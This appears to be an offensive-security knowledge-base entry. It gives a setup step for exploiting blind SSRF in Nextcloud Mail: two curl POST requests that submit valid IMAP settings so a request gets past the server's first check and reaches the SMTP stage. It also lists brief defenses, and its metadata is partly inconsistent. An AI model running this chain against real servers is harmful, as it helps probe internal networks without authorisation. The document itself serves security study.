---
id: proc-imap-config-nextcloud-1746582
tags:
  - imap
  - setup
  - bypass
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-post-mail-setup]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T04:39:09.859Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Configure-Valid-IMAP-Settings-for-Mail-Setup

## Summary

This procedure sets up valid IMAP configuration in the Nextcloud Mail app to pass initial server checks, enabling subsequent SMTP validation where the SSRF vulnerability can be exploited.

## Description

In the context of exploiting blind SSRF in Nextcloud Mail, valid IMAP settings are required to bypass the first validation stage. Using a public IMAP server like ssl0.ovh.net ensures the request reaches the SMTP check without errors. This step authenticates the user and prepares the payload for internal probing.

## Requirements

1. Authenticated Nextcloud session with Mail app access
2. Valid IMAP credentials (e.g., from a test account on ovh.net)
3. Network access to external IMAP server (port 993)

## Defense

Defensive measures and detection strategies:

- Enforce strict allowlists for IMAP/SMTP hosts in Mail app
- Monitor for unusual IMAP connection patterns from app servers
- Implement rate limiting on account setup endpoints

## Objectives

1. Pass IMAP validation to reach SMTP phase
2. Avoid early rejection of the request
3. Enable SSRF exploitation in subsequent steps

## Instructions

### Step 1: Prepare IMAP Payload

**Context**: Define valid IMAP parameters to include in the POST request.

**Command** ([[commands/curl-post-mail-setup]]):
```bash
curl -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"imapHost":"ssl0.ovh.net","imapPort":993,"imapSslMode":"ssl","imapUser":"your_imap_user","imapPassword":"your_imap_pass"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

> This command sends the base payload with IMAP details. Expected output: 200 OK with IMAP validation success, no connection errors.

### Step 2: Verify IMAP Connection

**Context**: Confirm the settings allow progression to SMTP.

**Command** ([[commands/curl-post-mail-setup]]):
```bash
curl -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"imapHost":"ssl0.ovh.net","imapPort":993,"imapSslMode":"ssl","imapUser":"your_imap_user","imapPassword":"your_imap_pass","smtpHost":"example.com","smtpPort":587,"smtpSslMode":"tls","smtpUser":"user","smtpPassword":"pass"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

> Adds minimal SMTP to test full flow. Expected output: Response after both checks, confirming bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-post-mail-setup]]

## Tools Used

- [[tools/curl]]

## Tags

- imap
- setup
- bypass
